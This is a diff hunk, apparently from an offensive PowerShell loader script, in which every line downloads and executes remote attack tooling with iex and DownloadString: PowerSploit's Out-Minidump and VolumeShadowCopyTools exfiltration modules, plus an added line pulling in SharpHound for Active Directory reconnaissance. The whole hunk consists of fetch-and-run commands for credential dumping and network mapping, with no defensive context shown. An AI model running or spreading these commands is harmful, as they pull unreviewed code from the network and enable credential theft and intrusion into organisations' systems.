@@ -32,4 +32,7 @@ iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1")
 iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/VolumeShadowCopyTools.ps1")
 
+# add Invoke-Bloodhound
+iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")
+
 
